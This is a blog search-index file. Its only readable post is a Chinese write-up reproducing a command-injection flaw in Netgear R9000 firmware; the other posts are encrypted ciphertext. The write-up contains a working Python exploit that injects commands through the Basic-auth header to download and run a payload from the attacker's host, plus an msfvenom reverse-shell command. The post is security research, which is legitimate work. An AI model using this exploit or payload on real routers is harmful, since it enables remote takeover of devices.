<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>AI安全研习</title>
    <url>/2023/10/30/AI%E5%AE%89%E5%85%A8%E7%A0%94%E4%B9%A0/</url>
    <content><![CDATA[
<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="fe8cc9e8e651bf10bdee690168d10acac9993d74dcd4c5262dc9763cc6c56acc">2d806215ddc7c4fd1f6babc1a9ab678d5631f1876bfd11d63fd6ecbf724f9357</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-swup-reload-script src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
  </entry>
  <entry>
    <title>Netgear-CVE-2019-20760</title>
    <url>/2023/10/05/Netgear-CVE-2019-20760/</url>
    <content><![CDATA[<h2 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><ul>
<li><strong>漏洞服务：</strong> <code>uhttpd</code></li>
<li><strong>漏洞类型：</strong> 远程命令执行</li>
<li><strong>影响范围：</strong> 1.0.4.26之前的NETGEAR R9000设备会受到身份验证绕过的影响</li>
<li><strong>解决建议：</strong> 更新版本</li>
</ul>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><ul>
<li><strong>操作环境：</strong> ubuntu:22.04</li>
<li><strong>qemu-version：</strong> 8.1.1</li>
</ul>
<h3 id="仿真环境"><a href="#仿真环境" class="headerlink" title="仿真环境"></a>仿真环境</h3><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">wget https://www.downloads.netgear.com/files/GDC/R9000/R9000-V1.0.4.26.zip</span><br></pre></td></tr></table></figure></div>

<p>下载固件。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">binwalk -Mer R9000-V1.0.4.26.img </span><br></pre></td></tr></table></figure></div>

<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/05/Netgear-CVE-2019-20760/image-20231006204853421.png"
                      alt="image-20231006204853421"
                ></p>
<p>可通过 <code>binwalk</code> 常规解压获得文件系统。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/05/Netgear-CVE-2019-20760/image-20231006213813263.png"
                      alt="image-20231006213813263"
                ></p>
<p>检查 <code>ELF32</code> 文件架构为 <code>arm-32-little</code>。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">wget https://file.erlkonig.tech/debian-armhf/wheezy/debian_wheezy_armhf_standard.qcow2</span><br><span class="line">wget https://file.erlkonig.tech/debian-armhf/wheezy/initrd.img-3.2.0-4-vexpress</span><br><span class="line">wget https://file.erlkonig.tech/debian-armhf/wheezy/vmlinuz-3.2.0-4-vexpress</span><br></pre></td></tr></table></figure></div>

<p>下载合适的虚拟机映像。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">参考《CTF实战》by ChaMd5</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">&#x27;ens33&#x27;</span>: The NIC is that can connect internet</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">sudo ifconfig eth0 down                 <span class="comment"># 首先关闭宿主机网卡接口</span></span></span><br><span class="line">sudo brctl addbr br0                     # 添加一座名为 br0 的网桥</span><br><span class="line">sudo brctl addif br0 ens33               # 在 br0 中添加一个接口</span><br><span class="line">sudo brctl stp br0 off                   # 如果只有一个网桥，则关闭生成树协议</span><br><span class="line">sudo brctl setfd br0 1                   # 设置 br0 的转发延迟</span><br><span class="line">sudo brctl sethello br0 1                # 设置 br0 的 hello 时间</span><br><span class="line">sudo ifconfig br0 0.0.0.0 promisc up     # 启用 br0 接口</span><br><span class="line">sudo ifconfig ens33 0.0.0.0 promisc up   # 启用网卡接口</span><br><span class="line">sudo dhclient br0                        # 从 dhcp 服务器获得 br0 的 IP 地址</span><br><span class="line">sudo brctl show br0                      # 查看虚拟网桥列表</span><br><span class="line">sudo brctl showstp br0                   # 查看 br0 的各接口信息</span><br><span class="line">sudo tunctl -t tap0 -u root              # 创建一个 tap0 接口，只允许 root 用户访问</span><br><span class="line">sudo brctl addif br0 tap0                # 在虚拟网桥中增加一个 tap0 接口</span><br><span class="line">sudo ifconfig tap0 0.0.0.0 promisc up    # 启用 tap0 接口</span><br><span class="line">sudo brctl showstp br0</span><br></pre></td></tr></table></figure></div>

<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/05/Netgear-CVE-2019-20760/image-20231006215529022.png"
                      alt="image-20231006215529022"
                ></p>
<p>配置网络。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line">qemu-system-arm \</span><br><span class="line">    -M vexpress-a9 \</span><br><span class="line">    -kernel vmlinuz-3.2.0-4-vexpress \</span><br><span class="line">    -initrd initrd.img-3.2.0-4-vexpress \</span><br><span class="line">    -drive if=sd,file=debian_wheezy_armhf_standard.qcow2 \</span><br><span class="line">    -append &quot;root=/dev/mmcblk0p2 console=ttyAMA0&quot; \</span><br><span class="line">    -net nic -net tap,ifname=tap0,script=no,downscript=no \</span><br><span class="line">    -nographic</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">-M              			# 选择开发板​</span><br><span class="line">-m							# 指定内存大小</span><br><span class="line">-drive         			    # 定义存储驱动器​</span><br><span class="line">file=         			    # 定义镜像文件​</span><br><span class="line">-net nic       			    # 创建客户机网卡​</span><br><span class="line">-net tap                    # 创建 tap 设备，以桥接方式跟宿主机通信​</span><br><span class="line">ifname=virtual0             # tap 设备与名为 virtual0 的虚拟网卡进行桥接通信​</span><br><span class="line">-nographic                  # 以非图形化模式启动​</span><br><span class="line">-append        			    # 内核启动附加参数​</span><br><span class="line">-console=ttyAMA0		    # console指向串口，有此启动参数，内核启动日志才能输出到宿主机终端</span><br><span class="line">-nographic					# 不再启用额外的终端界面</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/05/Netgear-CVE-2019-20760/image-20231006220307746.png"
                      alt="image-20231006220307746"
                ></p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/05/Netgear-CVE-2019-20760/image-20231006220609818.png"
                      alt="image-20231006220609818"
                ></p>
<p>启动 <code>qemu-system-armhf</code> 环境，默认用户名密码都为 <code>root</code>。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">ifconfig eth0 192.168.152.168/24</span><br></pre></td></tr></table></figure></div>

<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/05/Netgear-CVE-2019-20760/image-20231006220912835.png"
                      alt="image-20231006220912835"
                ></p>
<p>为 <code>qemu-system-armhf</code> 配置静态 <code>IP</code>。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">tar -cvf squashfs-root.tar.gz squashfs-root/</span><br><span class="line">python3 -m http.server</span><br></pre></td></tr></table></figure></div>

<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/05/Netgear-CVE-2019-20760/image-20231006221335309.png"
                      alt="image-20231006221335309"
                ></p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/05/Netgear-CVE-2019-20760/image-20231006221428854.png"
                      alt="image-20231006221428854"
                ></p>
<p>将文件根系统打包，然后利用 <code>python3</code> 的 <code>http.server</code> 模块下载到 <code>qemu-system-armhf</code>  的根目录中并用 <code>tar xvf squashfs-root.tar.gz </code> 解压。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">cd /squashfs-root</span><br><span class="line">mount --bind /proc proc # proc目录是一个虚拟文件系统，可以为linux用户空间和内核空间提供交互</span><br><span class="line">mount --bind /dev dev   # /dev/下的设备是通过创建设备节点生成的，用户通过此设备节点来访问内核里的驱动</span><br><span class="line">chroot . sh</span><br></pre></td></tr></table></figure></div>

<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/05/Netgear-CVE-2019-20760/image-20231006222713410.png"
                      alt="image-20231006222713410"
                ></p>
<p>因为 <code>chroot</code> 会导致无法在隔离的文件系统中访问原本的 <code>/proc</code>和  <code>/dev</code> 目录，这里利用 <code>mount</code> 命令将 <code>qemu-system-armhf</code>  的 <code>proc</code> 和 <code>dev</code> 目录挂在到 <code>squashfs-root</code> 中，并更换根目录为 <code>squashfs-root</code>。</p>
<h3 id="Web模拟"><a href="#Web模拟" class="headerlink" title="Web模拟"></a>Web模拟</h3><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">find -name uhttpd</span><br><span class="line">cat ./etc/init.d/uhttpd</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">./etc/init.d/uhttpd</span></span><br><span class="line">...</span><br><span class="line">start() &#123;</span><br><span class="line"><span class="meta prompt_">	#</span><span class="language-bash">config_load uhttpd</span></span><br><span class="line"><span class="meta prompt_">	#</span><span class="language-bash">config_foreach start_instance uhttpd</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">	#</span><span class="language-bash"><span class="built_in">mkdir</span> /tmp/www</span></span><br><span class="line"><span class="meta prompt_">	#</span><span class="language-bash"><span class="built_in">cp</span> -rf /usr/www/* /tmp/www</span></span><br><span class="line"></span><br><span class="line">	/www/cgi-bin/uhttpd.sh start</span><br><span class="line">	inetd</span><br><span class="line">	detplc</span><br><span class="line">    #for bug58012</span><br><span class="line">    touch /tmp/fwcheck_status</span><br><span class="line">&#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure></div>

<p>查找 <code>uhttpd</code> 的相关文件。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line"></span><br><span class="line">REALM=`/bin/cat /module_name | sed &#x27;s/\n//g&#x27;`</span><br><span class="line">UHTTPD_BIN=&quot;/usr/sbin/uhttpd&quot;</span><br><span class="line">PX5G_BIN=&quot;/usr/sbin/px5g&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">uhttpd_stop()</span><br><span class="line">&#123;</span><br><span class="line">	kill -9 $(pidof uhttpd)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">uhttpd_start()</span><br><span class="line">&#123;</span><br><span class="line">        $UHTTPD_BIN -h /www -r $&#123;REALM&#125;  -x /cgi-bin -t 70 -p 0.0.0.0:80 -C /etc/uhttpd.crt -K /etc/uhttpd.key -s 0.0.0.0:443</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">case &quot;$1&quot; in</span><br><span class="line">	stop)</span><br><span class="line">		uhttpd_stop</span><br><span class="line">	;;</span><br><span class="line">	start)</span><br><span class="line">		uhttpd_start</span><br><span class="line">	;;</span><br><span class="line">	restart)</span><br><span class="line">		uhttpd_stop</span><br><span class="line">		uhttpd_start</span><br><span class="line">	;;</span><br><span class="line">	*)</span><br><span class="line">		logger -- &quot;usage: $0 start|stop|restart&quot;</span><br><span class="line">	;;</span><br><span class="line">esac</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/05/Netgear-CVE-2019-20760/image-20231006223655990.png"
                      alt="image-20231006223655990"
                ></p>
<p>查看 <code>start()</code> 函数中利用的 <code>/www/cgi-bin/uhttpd.sh</code> 脚本。发现启动命令为 <code>$UHTTPD_BIN -h /www -r $&#123;REALM&#125;  -x /cgi-bin -t 70 -p 0.0.0.0:80 -C /etc/uhttpd.crt -K /etc/uhttpd.key -s 0.0.0.0:443</code> 其中 <code>REALM = R9000</code> ，<code>UHTTPD_BIN = /usr/sbin/uhttpd</code>。我们无需开启 <code>https</code>，所以启动命令为 <code>/usr/sbin/uhttpd -h /www -r R9000 -x /cgi-bin -t 70 -p 0.0.0.0:80</code>。</p>
<h3 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h3><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">wget https://www.downloads.netgear.com/files/GDC/R9000/R9000-V1.0.4.28.zip</span><br></pre></td></tr></table></figure></div>

<p>获取修复版本的固件。因为源码较为繁杂，我们通过 <code>Bindiff</code> 进行二进制比对，来查找漏洞点。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/05/Netgear-CVE-2019-20760/image-20231006231411605.png"
                      alt="image-20231006231411605"
                ></p>
<p><code>shift+D</code> 选取修复版本的 <code>/usr/sbin/uhttpd</code> 文件即可，主要查看登录验证的 <code>uh_cgi_auth_check()</code> 函数。</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x1000</span>u);</span><br><span class="line">  v14 = <span class="built_in">strlen</span>(v13);</span><br><span class="line">  <span class="built_in">uh_b64decode</span>(s, <span class="number">0xFFF</span>, v13 + <span class="number">6</span>, v14 - <span class="number">6</span>);</span><br><span class="line">  v15 = <span class="built_in">strchr</span>(s, <span class="string">&#x27;:&#x27;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !v15 )</span><br><span class="line">  &#123;</span><br><span class="line">LABEL_32:</span><br><span class="line">    v16 = <span class="number">0</span>;</span><br><span class="line">    v17 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_15;</span><br><span class="line">  &#125;</span><br><span class="line">  v16 = v15 + <span class="number">1</span>;</span><br><span class="line">  *v15 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v15 != (<span class="type">char</span> *)<span class="number">0xFFFFFFFF</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">snprintf</span>(command, <span class="number">0x80</span>u, <span class="string">&quot;/usr/sbin/hash-data -e %s &gt;/tmp/hash_result&quot;</span>, v15 + <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">system</span>(command);</span><br><span class="line">    v3 = <span class="built_in">cat_file</span>(<span class="number">73805</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  v17 = s</span><br></pre></td></tr></table></figure></div>

<p>漏洞版本 <code>base64</code> 解密后 <code>snprintf()</code> 后直接传给 <code>system()</code> 执行，这里会把 <code>v15(:)</code>后面的内容放到 <code>%s</code> 处，记得加<code>\n</code>来执行多条指令。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x1000</span>u);</span><br><span class="line">  v15 = <span class="built_in">strlen</span>(v14);</span><br><span class="line">  <span class="built_in">uh_b64decode</span>(s, <span class="number">4095</span>, v14 + <span class="number">6</span>, v15 - <span class="number">6</span>);</span><br><span class="line">  v16 = <span class="built_in">strchr</span>(s, <span class="number">58</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !v16 )</span><br><span class="line">  &#123;</span><br><span class="line">LABEL_15:</span><br><span class="line">    v17 = <span class="number">0</span>;</span><br><span class="line">    v18 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_16;</span><br><span class="line">  &#125;</span><br><span class="line">  v17 = v16 + <span class="number">1</span>;</span><br><span class="line">  *v16 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v16 != (<span class="type">char</span> *)<span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v18 = s;</span><br><span class="line">    <span class="built_in">dni_system</span>(<span class="string">&quot;/tmp/hash_result&quot;</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="string">&quot;/usr/sbin/hash-data&quot;</span>, <span class="string">&quot;-e&quot;</span>, v17, <span class="number">0</span>);</span><br><span class="line">    v19 = <span class="built_in">cat_file</span>(<span class="string">&quot;/tmp/hash_result&quot;</span>);</span><br><span class="line">    <span class="keyword">goto</span> LABEL_17;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></div>

<p>而修复版本则利用 <code>dni_system()</code> 执行，只可控参数。</p>
<h3 id="获取权限"><a href="#获取权限" class="headerlink" title="获取权限"></a>获取权限</h3><p>poc:</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">cmd  = <span class="string">&#x27;admin:&#x27;</span></span><br><span class="line">cmd += <span class="string">&#x27;`&#x27;</span></span><br><span class="line">cmd += <span class="string">&#x27;wget http://192.168.152.167:8000/shell.elf\n&#x27;</span></span><br><span class="line">cmd += <span class="string">&#x27;chmod 777 ./shell.elf\n&#x27;</span></span><br><span class="line">cmd += <span class="string">&#x27;./shell.elf\n&#x27;</span></span><br><span class="line">cmd += <span class="string">&#x27;`&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span>(<span class="built_in">len</span>(cmd) &lt; <span class="number">255</span>)</span><br><span class="line"></span><br><span class="line">cmd_b64 = base64.b64encode(cmd.encode()).decode()</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10.16; rv:85.0) Gecko/20100101 Firefox/85.0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;keep-alive&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Authorization&quot;</span>: <span class="string">&quot;Basic &quot;</span> + cmd_b64</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">attack</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        requests.get(<span class="string">&quot;http://192.168.152.168/cgi-bin/&quot;</span>, headers=headers, timeout=<span class="number">3</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line"></span><br><span class="line">attack()</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">msfvenom -p linux/armle/shell_reverse_tcp LHOST=192.168.152.167 LPORT=10086 -f elf &gt; shell.elf</span><br></pre></td></tr></table></figure></div>

<p>利用 <code>msf</code> 生成对应架构的木马程序，然后在<code>shell.elf</code>所在的目录开启<code>http</code>服务，利用漏洞将木马程序下载下来。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/05/Netgear-CVE-2019-20760/image-20231006233741185.png"
                      alt="image-20231006233741185"
                ></p>
<p>启动监听，并执行 <code>exp.py</code></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/05/Netgear-CVE-2019-20760/image-20231006234357194.png"
                      alt="image-20231006234357194"
                ></p>
<p>成功获取 <code>shell</code>，我们利用获取的权限在 <code>www</code> 目录创建 <code>flag.txt</code> 文件然后访问它。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/05/Netgear-CVE-2019-20760/image-20231006234709504.png"
                      alt="image-20231006234709504"
                ></p>
<p>成功创建。</p>
]]></content>
      <categories>
        <category>IOT</category>
      </categories>
      <tags>
        <tag>IOT-CVE</tag>
      </tags>
  </entry>
  <entry>
    <title>IoT-入门篇</title>
    <url>/2023/10/17/IoT-%E5%85%A5%E9%97%A8%E7%AF%87/</url>
    <content><![CDATA[
<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="4ede199db40f29b037c8a719af59419279ef83db4380d9d959fde8f9f742505c">2d806215ddc7c4fd1f6babc1a9ab678d6b15992746f26bfdbdf0a2f49fb26f63d479e637eae3b4c263955e20718ead88425721e59897576ca2ea7d87397cf595622433febed7f2acedcd78abc227bd6f9c15c23aa3661fae896ec9b986cf10dfee323e32dfacb4333ee5d70bed3835ebc607def94fd2e7dcb9a7ccf7ad9e1301d0c0b1c1229391da92fb22761668bd1c07293b1c893bbf66a4eb331dd96c0f8cb6a7be6203088dcf31e49d0797c7d10c67dce7a356b585257c0acd5c87f1d63de31d1ef90e461545b84f49f802e7821bb2104f0506498760ac8114e8a17f675c61d227d5ecb7ed0b97ae6c8c2611ef9e4b6bd2f4805decb9e355b4ab5488d3be7e41da71ad537e7e511e55e24a5beff60f32da4bdf8859ec3d75dcb1ac32f9a783da40a0d348900fcbfa1389bec503eded42a8a5ec3fec516221d58e1570f86116c0ea4dc5753743a5e9deded79a23483a7bfb80b54b7b0c9de541d5f1660d00e7cbd512a9d170161ce7de31372a7e4fa12747e8b0e9391a3a6d4b4c6a53770380d436141178582c7da3c8e96fe0d7e8a773a09007e6f7fa845d4fbafc300e7d318401a06cbac291f6a7c54d480389ad69baa862011ca3d18229a0d4bfd76b246728bfa5235a6e684012b315e808b3d47aaee6e7cf91568447775699852306cf6abca8c4fc429ceded9bcef255e4b056f3043173904b544c63b9b4d1df7d6f43b04fa10b80a7553ed4d8a93cf1910bb8908f6f7726aceb134fbf8d3a7e6ed8b7c7dc06b7863c463d56909a46f366640100765cd914d96358066b51f99798a66d2294201e97990f2b4a8e768ead46392a687de8b2e8239106491b3bdb06f33d129a9a5cdff223068f5d56f3979d9c6a82d29a5847e2ec704650fef6f97b041d5d18cc5cee0849430090e72db15bf4a7b36bf156f49a2f06b1c2f267c87735d5fa18f6f1f2f89a812d063aa0ae28340f10d741c32be867e6dedc82bd865d06d4f74eceeed1b097d83f5d8e07221204c2b9080ef5ac5612a3f9aa2c28fc3c6dfc896e861ee5488747c2d7305161bb14ec1b5692d4dcf01acc9897bbfd1e11693b776178f9f2b94d341bd5ae04ccc4e74c54e25c607fef0e0a2956e512d034858972d17e2ceef95a4bb2f9bf824ba9c6860673d5b5fa60e0fe0339eed45eab141d61b55c017b15fdff0ae4dbbc8fde90c643bee1a6944728b045b7dc4cc835a643847d554a3c311f1c14cb5968c8f0881eb1895d879f441303ccb963dcc8dc301f446d669e8a8eaffeb9a67d7d6f55d656e0618a37446afc6c8e2ab7afe32a6d6b75ca545e2fc8ebc509502d4beecd64949c21679f309a6f75729285c2c4609f5c10d6d52440fbeba6de0659b458fad83abdee96d7596e7d23d9020c813fe0d09e0d047cf83443747c71174d72bbb24b883b0a63a23c835e3114fadba586952503e909fbbc52f17ee6fa9a885c745f138119a190bf495a945c64b5fd0112e85efa3825e58cbcfa9862ba035efba5ff22d32041482bc3d96565f88cbd8385922f1e033462de0256c2c1cf7d8b266b6f5a9199a492cd447e9a3ffa4763c2c0a954fb034aa1afd0e1e30fa6c6e9631c46df8723a00ffabd875564a113a5441a5b378a2d98c0e9a7ddc83756ea1d630329afedad52f818a647d87cffbbe7b67b7db27cfbb96b4085e102ddb37e1cbbdb057c7af5a9deac94dab99c6fa144df00a7deb1832d4d3fd9fd684f6221bfb159a553813ad8e6859098e1bf781f4a40c63b028110979c6478a37de4d344e129b566431ca214366016e7ff310f795581613a3befa01992dc55eaca603d042e58b31515423f12208a56f3309ec318ac1253ce96d89a45b70a7415375e98bd1d23d37b0642f0478f50f8b7fc032988080ed4f625b7526f391f461347aa0758e5dd2020274f27c41e36c79dfb1492c89f1dd4f91e094ecaa55f381abdd0bc6a364726aa692ce6457980ac4e99579e3cbb604a457c73bf6413f7819e9d055ff4248c2d1f6b5f3429bb10ce14a96f81ad35072eaa6fa39d042a57ef6e1954a978038a9a57cf1f2f35115f9975f1ff24974a7a9f486361b439402e1d7e04b16deb62d3a93f944d02d8599974816d47a3073ea91691047f2a042c3c57c63492295c2da87909cc5903e514a472dd38246fd81f26feec104a6eeecea7090d3d7ee46f9cdf980ffebdde55e4dc032d8a7dfedaaf0824e9a9875642e6411b6a5c5d7928b34da105ea42f5d865e45cd6abee21a4ea83150d477411274a430df5f5477ce0d56eab334c9e1324c99d84e2d64b1d806d90541e72217befe06105c0b1ee76d0e0a03b537a63d4bcf142302f8adaa3201ea056edb028bfc0216085c70a2495755b1044f9927b290bae68eb2f0971685dc37b70924a08ecae13b1bb957be7c91cde608c2cb47d49c1c6684e136fb183be53216f92768be928795c1c76d473b685fbde4b6a29259bc0bce78937aa60463b82e88566725455235f62baab13930c12e0d7407a2598ea9b611c4d95c17c28b582ea7c83e8e02261d8413e953236eaf15b4776d15270291d9cd47bcc4cc85197f36a37331b11cd215b097c005b2363552562edb41954e5d4035e369a34c5a218b1016a4d9c5dd1427c865c758c10308a7cd9e7ba60faf9d7729ed210473368938873a059a5a8e12e14a280abafdf7ed295074b1f4d958599fa45f85a6b1cad1cb2f31b739d017f7bf0689deda17436573607d5058e43f2e0b73a8605846e8cfb5740a28adce5d1698df9f4e0d75ef18c262c1394133a2258d4aa12a1c89f2a917828e6d3399eb3e5b84b5d968758efcccf81448d91fd48c3f3475c53abf12446a660bcc0078fe34b48a6e25848b9ff2b9cb0887b9849302d733e949cae37f6c559baef3725da4e04a442510ea03ad4a6309c8ee8b9b91d6b9e1fee5e83e51feb231d23a937307c40ed1c5d015be90c38e6e4d7c0c0c1796b119ae3d511736b6be53d0ec866a0697a56d0874f990f8370cc55e75960a932f38189102d729dec1e7d6b735ebc63e498ebd2f6b1686245c31a5d008f919ede9f7088e2a73041e2afae54c8e1d369fcaadf8d2af2598a1773967878b85a8f2c4877330b6e912b634e1d237e51da7599c1293a98938df73ff3b4cb84d1fc39ff98232438be495270f6a95e25ca359c41996f31c7c3c1c2ffe1ba409737c9b64ddd55a3f7959b9fd3dcb0598c90270b945a15a905e5ed0de54f42f6aa8f5bb9a5e95d9e39ded80111025b610dececae43deef28fa7912bd201ba3545db5bdae8485dd3a173e5446a3ac53c248783e088519d29c06c1bc6f15391f64366f776d7bce79dbcb2e06ffc2007f8412471dcca52611fbb25771d6bcd83199b676598ad6da7f430e002a88d38e5bc71d1516d5cfb40e2d2fcf63de6b73b04b28a43b8cad465c74474f8b0efc98bd0e447102fc4c767a223280f223cd8592b728b10d23b97c708b8f410cd1a5e66c091537aa77f9276579eb01e7a1edd319135782be3a026e9b718e2a98ad0fc9fdf026f5549bdcd27d21e45096bf3c0eb18051491edb00ccb45cf2dfb3219c58dbee8f862f3e6d4f6971bf4b308cbf79401680d69fd0af15dacd6726244218ee83e97e8406163b65ff5b0defee6f8c2bfc77924f0d68a5acbfdf6856e2fe1e6ff03450b992f3097e37c2cb7a622c9077549b5033fdf6b9c508f4f99f16aa9eed1721082cbdf32f9d595718a47171e06df7a33f1193df35aa37f99fbe4d22593ea28b059e15c76698b8b137af94369fb7c04e19301bc822c7f7f3b7583c3f4e23c16848a001ec99e520f6409c857477c6d7c53c47d735192648757f1c9e7537539528ecce6bda395c4adf279fa509256a0abbd62cd0d61f22448380d2af2f08343ac1fe94658bdace9862160ebd9109301a9e384c694baabfbb3113b724925eefecb17207baf210d6cb0dee43b67e6257e33b08402aa0f6877bb65af42a79f645062241241cea26d944c282783773fb25667a3a68eeeb7b0ad03ce4c85beed50a962b577b65cadbee9266c38e7904bdbab4bec91ef101a4a7d0e3138013c92a84ed9d8c979ea41a8f362b69508c9fc951a7ccd603ce6445eabfe70388d05c89af90b64b0252b9a309502642ef4e18d994a396ada9d1371802b36e6b66d28ae05dafae90f4eb8fff501f082cd9a06329e31d391ae798050f0d9a132e883e5749ae532c130009fcb1dd395bb7c9b29dafd3fba27b8458728bca6bd9fd2b080c36c785a66a84e70c93ba1bcb11bce30dad92e5c154436c1a5e285f80354f48de06914822e9cfad6d4e23c4a6fcc91e8fafc5c6593111e737b0de26770e4db109141b2c9ab86b36a32ec2d0141de2212e0ad078b3456732441cd5d81fe9f7fd4bfa5404691d98865cffc5695a715c42ccff45472090fd